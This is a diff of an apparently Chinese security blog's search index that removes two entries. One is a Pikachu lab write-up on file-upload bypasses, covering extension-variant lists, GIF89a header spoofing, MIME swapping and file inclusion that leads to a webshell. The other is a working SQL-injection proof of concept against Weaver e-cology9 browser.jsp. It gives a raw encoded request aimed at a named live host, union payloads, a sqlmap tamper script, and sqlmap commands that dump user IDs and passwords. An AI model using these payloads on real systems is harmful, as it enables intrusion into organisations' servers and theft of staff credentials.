class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>
-
-<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
-<p>可以看到还校验了文件内容</p>
-<p><img src="/images/image-20230110112128136.png" alt="image-20230110112128136"></p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
-
-<p>这是gif文件的文件头</p>
-<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
-<p>2.更改后缀为png</p>
-<p>3.更改MIME类型为image&#x2F;png</p>
-<p><img src="/images/image-20230110113115973.png" alt="image-20230110113115973"></p>
-<p>成功上传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
-
-<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
-
-<p>url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-
-<p>成功连接webshell</p>
-<p><img src="/images/image-20230110133348854.png" alt="image-20230110133348854"></p>
-<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
-<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
-<p>MIME是由上传文件的body的Content-Type指定的</p>
-<p><img src="/images/image-20230110111354014.png" alt="image-20230110111354014"></p>
-<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
-<p><img src="/images/image-20230110111246587.png" alt="image-20230110111246587"></p>
-<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
-<p>将其改为jpg或png的MIME类型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>
-
-<p>成功上传</p>
-<p><img src="/images/image-20230110111611594.png" alt="image-20230110111611594"></p>
-<p>成功连接webshell</p>
-<p><img src="/images/image-20230110111625267.png" alt="image-20230110111625267"></p>
-<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
-<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>
-
-<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
-
-<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>
-
-<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
-
-<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>
-
-<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>pikachu靶场系列</category>
       </categories>
@@ -2354,42 +2390,6 @@
 ]]></content>
       <categories>
         <category>社工</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>泛微e-cology9 browser.jsp SQL注入</title>
-    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>
-
-<p>sql语句经过了三层全字符的url编码</p>
-<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
-<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
-<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
-<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>
-
-<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
-]]></content>
-      <categories>
-        <category>POC</category>
       </categories>
   </entry>
   <entry>
